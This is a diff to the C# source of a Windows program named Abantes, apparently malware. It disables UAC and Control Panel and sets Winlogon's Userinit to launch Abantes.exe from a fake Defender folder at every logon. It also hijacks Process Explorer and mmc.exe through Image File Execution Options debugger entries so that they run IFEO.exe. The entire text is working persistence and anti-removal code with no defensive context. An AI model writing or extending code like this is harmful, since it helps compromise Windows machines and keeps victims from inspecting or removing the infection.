@@ -64,8 +64,11 @@ namespace Abantes
                 editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                 editKey.SetValue("NoControlPanel", "1");
                 editKey.Close();
-                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\WindowsNT\CurrentVersion\Winlogon");
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
                 editKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
+                editKey.SetValue("Userinit", Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\System32\userinit.exe, " + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\Defender\Abantes.exe", RegistryValueKind.String);
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                 editKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
@@ -144,6 +147,9 @@ namespace Abantes
                 editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                 editKey.Close();
                 editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\procexp64.exe");
+                editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe");
                 editKey.SetValue("Debugger", @"C:\Windows\Defender\IFEO.exe");
                 editKey.Close();
 
